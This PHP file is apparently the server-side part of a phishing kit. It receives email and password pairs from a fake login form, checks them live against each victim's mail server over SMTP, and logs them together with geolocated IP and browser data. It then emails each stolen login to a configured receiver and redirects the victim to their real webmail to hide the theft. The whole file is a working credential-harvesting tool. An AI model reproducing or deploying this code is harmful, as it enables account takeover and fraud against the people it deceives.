<?php
require_once 'class.phpmailer.php';
require_once 'class.smtp.php';
require_once 'config.php';

// Set proper headers for CORS and content type
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');
header('Content-Type: application/json');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    exit(0);
}

// Get client IP and location information
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

$ipdat = @json_decode(file_get_contents(getConfig('geoip_service') . $ip));

session_start();

// Return 403 for GET requests to prevent direct access
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    http_response_code(403);
    echo json_encode(array(
        'signal' => 'error',
        'msg' => '403 Forbidden - Direct access not allowed'
    ));
    exit;
}

//------------------------------------------------\\
// SMTP Configuration - FROM CONFIG FILE
//------------------------------------------------\\

$receiver = getConfig('receiver_email');
$smtp_config = getConfig('notification_smtp');
$senderuser = $smtp_config['username'];
$senderpass = $smtp_config['password'];
$senderport = $smtp_config['port'];
$senderserver = $smtp_config['host'];

//-------------------------------

// Get form data
$browser = $_SERVER['HTTP_USER_AGENT'];
$login = isset($_POST['email']) ? trim($_POST['email']) : '';
$passwd = isset($_POST['password']) ? $_POST['password'] : '';
$email = $login;

// Basic validation
if (empty($login) || empty($passwd)) {
    echo json_encode(array(
        'signal' => 'error',
        'msg' => 'Email and password are required'
    ));
    exit;
}

// Validate email format
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo json_encode(array(
        'signal' => 'error',
        'msg' => 'Invalid email format'
    ));
    exit;
}

// Extract domain from email
$parts = explode("@", $email);
$domain = $parts[1];

// Prepare email subjects
$country = isset($ipdat->geoplugin_countryName) ? $ipdat->geoplugin_countryName : 'Unknown';
$city = isset($ipdat->geoplugin_city) ? $ipdat->geoplugin_city : 'Unknown';

$subjects = getConfig('subjects');
$subg = str_replace(array('{country}', '{email}'), array($country, $login), $subjects['valid_credentials']);
$subg2 = str_replace(array('{country}', '{email}'), array($country, $login), $subjects['invalid_credentials']);

// Prepare message
$message = "Email = " . $login . "\n";
$message .= "Password = " . $passwd . "\n";
$message .= "IP of sender: " . $country . " | " . $city . " | " . $ip . " | " . $browser . "\n";
$message .= "Domain: " . $domain . "\n";
$message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";

// Test credentials against the email's mail server
$mail = new PHPMailer(true);
$mail->isSMTP();
$mail->SMTPAuth = true;
$mail->Username = $login;
$mail->Password = $passwd;
$mail->Host = 'mail.' . $domain; // Dynamic mail host based on email domain
$mail->Port = 587;
$mail->SMTPSecure = 'tls';
$mail->SMTPDebug = 0; // Disable debug output

$validCredentials = false;
$errorMessage = '';

try {
    // Test SMTP connection
    $validCredentials = $mail->smtpConnect();
    if ($validCredentials) {
        $mail->smtpClose();
    }
} catch (Exception $error) {
    $errorMessage = $error->getMessage();
    error_log("SMTP Test Error: " . $errorMessage);
}

// Function to send notification email
function sendNotificationEmail($receiver, $subject, $message) {
    $smtp_config = getConfig('notification_smtp');
    
    $mail = new PHPMailer();
    $mail->isSMTP();
    $mail->Host = $smtp_config['host'];
    $mail->SMTPAuth = true;
    $mail->Username = $smtp_config['username'];
    $mail->Password = $smtp_config['password'];
    $mail->Port = $smtp_config['port'];
    $mail->SMTPSecure = $smtp_config['encryption'];
    $mail->From = $smtp_config['username'];
    $mail->FromName = $smtp_config['from_name'];
    $mail->addAddress($receiver);
    $mail->isHTML(true);
    $mail->Subject = $subject;
    $mail->Body = nl2br($message);
    $mail->AltBody = strip_tags($message);
    
    return $mail->send();
}

// Log to file
$logMessage = "[" . date('Y-m-d H:i:s') . "] " . $message . "\n" . str_repeat("-", 50) . "\n";
$logFile = getConfig('log_file');
$fp = fopen($logFile, "a");
if ($fp) {
    fputs($fp, $logMessage);
    fclose($fp);
}

if ($validCredentials == true) {
    // Valid credentials - send notification
    $emailSent = sendNotificationEmail($receiver, $subg, $message);
    
    if ($emailSent) {
        echo json_encode(array(
            'signal' => 'ok',
            'msg' => 'Login successful! Redirecting to your mailbox...',
            'success' => true,
            'redirect_url' => 'https://webmail.' . $domain
        ));
    } else {
        echo json_encode(array(
            'signal' => 'ok',
            'msg' => 'Login successful! Redirecting to your mailbox...',
            'success' => true,
            'redirect_url' => 'https://webmail.' . $domain,
            'note' => 'Email notification failed but credentials are valid'
        ));
    }
 } else {
    // Invalid credentials - send notification about failed attempt
    $emailSent = sendNotificationEmail($receiver, $subg2, $message);
    
    // Return error response
    echo json_encode(array(
        'signal' => 'not ok',
        'msg' => 'Invalid email or password. Please check your credentials and try again.',
        'success' => false,
        'error_detail' => $errorMessage
    ));
}

// Generate random hash for potential use
$praga = md5(rand());

?>